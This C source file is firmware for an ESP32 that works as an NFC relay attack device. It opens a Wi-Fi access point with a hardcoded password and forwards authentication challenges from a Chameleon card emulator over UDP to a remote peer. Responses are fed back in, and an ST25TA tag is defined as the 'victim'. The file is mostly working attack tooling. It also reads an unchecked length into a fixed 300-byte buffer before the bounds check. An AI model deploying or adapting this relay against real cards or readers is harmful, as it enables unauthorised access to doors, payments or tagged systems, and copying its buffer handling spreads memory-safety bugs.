#include "relay_server.h"
#include "platform.h"
#include <sys/socket.h>
#include <netinet/in.h>


#define RX_PACKET_BUF_SIZE 300
#define CHALLENGE_BUF_SIZE 300

static const char* ssid     = "esp-nfc-relay";
static const char* password = "esp-nfc-relay";

static const char *local_ip_addr = "192.168.177.1";
static const char *netmask_ip_addr = "255.255.255.0";
static int udp_server;
static sockaddr_in local_address = {0};
static in_addr netmask_address = {0};
static sockaddr_in remote_address = {0};

static const uint16_t local_port = 61017;

static unsigned char challenge[CHALLENGE_BUF_SIZE];
static unsigned int challenge_len = 0;
static boolean chameleon_on = false;
static boolean chameleon_busy = false;

static unsigned long last_bc = 0;
static unsigned long last_udp = 0;
static unsigned long last_cha_ka = 0;
static unsigned long time_cha_got = 0;
static unsigned long time_resp_got = 0;
static unsigned long time_resp_sent = 0;

static const victim_t victim_example_ST25TA = {
  .name = "ST25TA",
  .aid = (uint8_t[]){ 0xd2, 0x76, 0x00, 0x00, 0x85, 0x01, 0x01 },
  .aid_len = 7,
  .aid_resp_len = 0,
};

static const victim_t *available_victims[] = { &victim_example_ST25TA };
static const unsigned int available_victims_count = sizeof(available_victims) / sizeof(available_victims[0]);
static const victim_t *victim = &victim_example_ST25TA;

static void chameleon_reset(boolean turnOn) {
  if (turnOn) {
    if (!chameleon_on) {
      // Switch on the chameleon
      Serial.println("Switing chameleon on");
      chameleon_on = true;
      digitalWrite(platform_get_pin(cham_pin_reset), HIGH);
      platform_report(event_chameleon_on);
    }
  } else {
    if (chameleon_on) {
      Serial.println("Switing chameleon off");
      chameleon_on = false;
      digitalWrite(platform_get_pin(cham_pin_reset), LOW);
      platform_report(event_chameleon_off);
    }
  }
}

static void chameleon_poll() {
  if (!chameleon_on) {
    Serial2.flush();
    return;
  }
  
  int next = Serial2.read();
  if (next != -1) {
    
    chameleon_busy = true;
    if (next == 0x55) {
      platform_report(event_chameleon_keep_alive);
    } else if (next == 0xAA) {
      int len_h, len_l;
      do { len_h = Serial2.read(); } while (len_h == -1);
      do { len_l = Serial2.read(); } while (len_l == -1);
      uint16_t len = (0xff00 & (len_h << 8)) | (0x00ff & len_l);
      challenge[0] = 'C';
      assert(len == Serial2.readBytes(challenge+1, len));
      assert(len < CHALLENGE_BUF_SIZE);
      time_cha_got = millis();
      time_resp_got = 0;
      time_resp_sent = 0;
      last_cha_ka = time_cha_got;
      challenge_len = len;

      if (remote_address.sin_addr.s_addr != 0) {
        sendto(udp_server, challenge, challenge_len+1, 0,
               (struct sockaddr *) &remote_address, sizeof(remote_address));
      }
      Serial.print("Chameleon application sent a ");
      Serial.print(challenge_len);
      Serial.println("-bytes challenge");
      platform_report(event_challenge_received, challenge, challenge_len+1);
    } else if (next == 0x52) {
      chameleon_busy = false;
      platform_report(event_chameleon_app_reset);
      if (challenge_len > 0) {
        Serial.println("Chameleon application was reset while waiting for response.");
        challenge_len = 0;
      }
    } else {
      platform_report(event_chameleon_sent_garbage, next);
      Serial.printf("Chameleon application sent 0x%02x", next);
      Serial.println();
    }
  }
}

static void do_udp_recv() {
  uint8_t incomingPacket[RX_PACKET_BUF_SIZE];
  struct sockaddr_in other = {0};
  socklen_t slen = sizeof(other);
  int packetSize;
  if ((packetSize = recvfrom(udp_server, incomingPacket, RX_PACKET_BUF_SIZE, MSG_DONTWAIT,
        (struct sockaddr *) &other, &slen)) == -1) {
    if(errno == EWOULDBLOCK){
      return;
    }
    Serial.print("could not receive UDP packet: ");
    Serial.println(errno);
    return;
  }
  if (packetSize <= 0) {
    return;
  }

  last_udp = millis();
  
  chameleon_reset(true);
  
  platform_report(event_udp_received, other, incomingPacket, packetSize);
  
  if (remote_address.sin_addr.s_addr != other.sin_addr.s_addr
      || remote_address.sin_port != other.sin_port) {
    Serial.println("New client connected");
    platform_report(event_client_connected);
    remote_address = other;
  }
  
  message_type mtype = mtype_unknown;
  if (packetSize > 0) {
    switch (incomingPacket[0]) {
      case 'R':
        mtype = mtype_response;
        break;
      case 'K':
        mtype = mtype_flow_control;
        break;
      case 'C':
        mtype = mtype_challenge;
        break;
      default:
        mtype = mtype_unknown;
    };
  }
  
  if (mtype == mtype_response && challenge_len > 0) {
    // this is the response for the previously submitted challenge
    // submit it to the chameleon
    challenge_len = 0;
    uint8_t len = packetSize-1;
    uint8_t buf[300];
    int r = 0;
    time_resp_got = millis();

    buf[r++] = 0x97;
    buf[r++] = len + 2;
    memcpy(buf + r, incomingPacket+1, len);
    r += len;
    memcpy(buf + r, "\x90\x00", 2);
    r += 2;
    
    Serial2.write(buf, r);
    Serial2.flush();
    time_resp_sent = millis();

    platform_report(event_response_received, incomingPacket, packetSize);

    Serial.print("Response sent: ");
    for (int i = 0; i < r; i++) {
      Serial.printf("%02x ", buf[i]);
    }
    Serial.println();
  }
  
  //log to Serial
  Serial.print("UDP From: ");
  Serial.print(htons(other.sin_port));
  Serial.print(":");
  Serial.print(inet_ntoa(other.sin_addr));
  Serial.print(", Length: ");
  Serial.print(packetSize);
  Serial.println();
}

void setup() {
  pinMode(platform_get_pin(cham_pin_reset), OUTPUT);
  digitalWrite(platform_get_pin(cham_pin_reset), LOW);

  platform_setup();
  
  Serial.begin(115200);
  Serial2.begin(115200, SERIAL_8N1, platform_get_pin(cham_pin_uart_rx), platform_get_pin(cham_pin_uart_tx));

  netmask_address = {0};
  assert(inet_aton(netmask_ip_addr, &netmask_address) == 1);
  local_address = {0};
  assert(inet_aton(local_ip_addr, &local_address.sin_addr.s_addr) == 1);
  local_address.sin_port = htons(local_port);
  local_address.sin_family = AF_INET;
  
  WiFi.persistent(false);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  delay(200);
  WiFi.softAPConfig(IPAddress(local_address.sin_addr.s_addr), IPAddress(local_address.sin_addr.s_addr), IPAddress(netmask_address.s_addr));
  
  assert((udp_server = socket(AF_INET, SOCK_DGRAM, 0)) != -1);
  assert(bind(udp_server, (struct sockaddr *) &local_address, sizeof(local_address)) == 0);

  Serial.print("UDP Listening on ");
  Serial.print(WiFi.localIP());
  Serial.print(":");
  Serial.println(htons(local_address.sin_port));

  // Serial2.println("This UART should be connected to the AUX port of the chameleon");
}

void loop() {

  chameleon_poll();
  do_udp_recv();

  platform_poll();
  
  unsigned long now = millis();
  if (now - last_udp > 5000) {
    if (remote_address.sin_addr.s_addr != 0) {
      Serial.println("Client lost");
      remote_address = {0};
      platform_report(event_client_lost);
      chameleon_reset(false);
    }
  }

  if (now - last_bc > 3000) {
    if (remote_address.sin_addr.s_addr == 0) {
      struct sockaddr_in broadcast_address = {0};
      broadcast_address.sin_family = AF_INET;
      broadcast_address.sin_port = htons(local_port);
      broadcast_address.sin_addr.s_addr = ~netmask_address.s_addr | local_address.sin_addr.s_addr;
      sendto(udp_server, "KAnyone here?", 13, 0,
              (struct sockaddr *) &broadcast_address, sizeof(broadcast_address));
    } else {
      sendto(udp_server, "KHey\n", 5, 0,
              (struct sockaddr *) &remote_address, sizeof(remote_address));
    }
    
    last_bc = now;
  }

  if (challenge_len > 0) {
    long since_challenge = (long)(now - time_cha_got);
    long since_cha_ka = (long)(now - last_cha_ka);
    if (since_challenge > 1000) {
      Serial.println("Time expired for response");
      challenge_len = 0;
    } else if (since_cha_ka > 50) {
      last_cha_ka = now;
      Serial2.write((const uint8_t *) "\x98", 1);
    }
  }
}

/* State getters for the user interface */
unsigned long get_time_since_last_udp() {
  return millis() - last_udp;
}

unsigned long get_time_challenge() {
  return time_cha_got;
}

unsigned long get_time_response() {
  return time_resp_sent;
}

bool is_chameleon_busy() {
  return chameleon_busy;
}

unsigned int get_challenge_len() {
  return challenge_len;
}

const victim_t *get_victim() {
  return victim;
}

void set_victim(const victim_t *v) {
  victim = v;
}

const victim_t **get_available_victims() {
  return available_victims;
}

unsigned int get_available_victims_count() {
  return available_victims_count;
}
